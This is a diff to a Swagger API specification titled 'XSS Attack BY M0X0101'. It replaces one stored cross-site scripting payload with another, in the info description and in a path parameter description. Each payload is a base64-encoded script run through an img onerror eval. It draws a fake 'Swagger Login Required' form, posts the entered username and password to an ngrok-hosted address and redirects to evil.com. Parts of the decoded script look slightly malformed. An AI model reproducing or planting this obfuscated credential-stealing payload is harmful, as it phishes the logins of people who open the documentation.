@@ -2,24 +2,8 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M0X0101
   description: |
-    This is a broken documentation.
-
-    <style>body,*{all:unset!important}</style><h1>XSS Test</h1>
-
-    Below is a test point:
-
-    <div>
-    <table>
-      <tr><td><b>Endpoint:</b></td><td>/hack/hachid/{id}</td></tr>
-      <tr><td><b>Method:</b></td><td>DELETE</td></tr>
-    </table>
-
-    <br><br>
-
-    <!-- XSS Executed at the bottom -->
-    <img src=x id='YWxlcnQoJ1lvdSBuZWVkIHRvIGxvZ2luIGZpcnN0Jyk7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EuYWN0aW9uPSdodHRwczovL2QwZWQtMjQwOS00MGQyLTEwZDgtMWQ0NS1jYjA1LWNjYTAtMzMyZi01YmI3Lm5ncm9rLWZyZWUuYXBwJzthLm1ldGhvZD0nUE9TVCc7YS5vbnN1Ym1pdD1mdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbi5ocmVmPSdodHRwczovL2V2aWwuY29tJ307YS5pbm5lckhUTUw9JzxjZW50ZXI+PGI+RkFLRSBTd2FnZ2VyIExvZ2luPC9iPjxicj5Vc2VybmFtZTogPGlucHV0IG5hbWU9InVzZXJOYW1lIj48YnI+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icHdkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>
-
-    </div>
+    <img src=x id='YWxlcnQoJ1lvdSBuZWVkIHRvIGxvZ2luIGZpcnN0Jyk7dmFyIGYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTtmLnN0eWxlID0gJ3Bvc2l0aW9uOmZpeGVkO3RvcDoxMHB4O2xlZnQ6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVYKC01MCUpO2JhY2tncm91bmQ6d2hpdGU7cGFkZGluZzoyMHB4O2JvcmRlcjoycHggc29saWQgIzAwMDt6LWluZGV4Ojk5OTk5O2ZvbnQtZmFtaWx5OnNhbnMtc2VyaWYnO2ZvbnQtc2l6ZToxMXB4JztmaWxsOiMwMDA7JztmLmlubmVySFRNTCA9IGA8Y2VudGVyPjxoMyBzdHlsZT0ibWFyZ2luOjA7Ij7wn5KPIFN3YWdnZXIgTG9naW4gUmVxdWlyZWQ8L2gzPjxicj48Zm9ybSBpZD0ieHNzTG9naW5Gb3JtIj5Vc2VybmFtZTogPGlucHV0IG5hbWU9InVzZXJOYW1lIj48YnI+PGJyIFBhc3N3b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InB3ZCI+PGJyPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvZm9ybT48L2NlbnRlcj5gO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZik7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3hzc0xvZ2luRm9ybScpLm9uc3VibWl0ID0gZnVuY3Rpb24oZSl7ZS5wcmV2ZW50RGVmYXVsdCgpO3ZhciBkYXRhID0gbmV3IEZvcm1EYXRhKHRoaXMpO0BmZXRjaCgnaHR0cHM6Ly9kMGVkLTI0MDktNDBkMi0xMGQ4LTFkNDUtY2IwNS1jY2EwLTMzMmYtNWJiNy5uZ3Jvay1mcmVlLmFwcCcsIHttZXRob2Q6J1BPU1QnLGJvZHk6ZGF0YX0pLmZpbmFsbHkoKGkpID0+IHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gJ2h0dHBzOi8vZXZpbC5jb20nKTt9' onerror='eval(atob(this.id))'>
+    ">
   version: production
 basePath: /JSSResource/
 produces:
@@ -43,7 +27,9 @@ paths:
   '/hack/hachid/{id}':
     delete:
       parameters:
-        - description: Broken Endpoint Test
+        - description: |
+            <img src=x id='YWxlcnQoJ1lvdSBuZWVkIHRvIGxvZ2luIGZpcnN0Jyk7dmFyIGYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTtmLnN0eWxlID0gJ3Bvc2l0aW9uOmZpeGVkO3RvcDoxMHB4O2xlZnQ6NTAlO3RyYW5zZm9ybTp0cmFuc2xhdGVYKC01MCUpO2JhY2tncm91bmQ6d2hpdGU7cGFkZGluZzoyMHB4O2JvcmRlcjoycHggc29saWQgIzAwMDt6LWluZGV4Ojk5OTk5O2ZvbnQtZmFtaWx5OnNhbnMtc2VyaWYnO2ZvbnQtc2l6ZToxMXB4JztmaWxsOiMwMDA7JztmLmlubmVySFRNTCA9IGA8Y2VudGVyPjxoMyBzdHlsZT0ibWFyZ2luOjA7Ij7wn5KPIFN3YWdnZXIgTG9naW4gUmVxdWlyZWQ8L2gzPjxicj48Zm9ybSBpZD0ieHNzTG9naW5Gb3JtIj5Vc2VybmFtZTogPGlucHV0IG5hbWU9InVzZXJOYW1lIj48YnI+PGJyIFBhc3N3b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InB3ZCI+PGJyPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvZm9ybT48L2NlbnRlcj5gO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZik7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3hzc0xvZ2luRm9ybScpLm9uc3VibWl0ID0gZnVuY3Rpb24oZSl7ZS5wcmV2ZW50RGVmYXVsdCgpO3ZhciBkYXRhID0gbmV3IEZvcm1EYXRhKHRoaXMpO0BmZXRjaCgnaHR0cHM6Ly9kMGVkLTI0MDktNDBkMi0xMGQ4LTFkNDUtY2IwNS1jY2EwLTMzMmYtNWJiNy5uZ3Jvay1mcmVlLmFwcCcsIHttZXRob2Q6J1BPU1QnLGJvZHk6ZGF0YX0pLmZpbmFsbHkoKGkpID0+IHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gJ2h0dHBzOi8vZXZpbC5jb20nKTt9' onerror='eval(atob(this.id))'>
+            ">
           format: int64
           in: path
           name: id
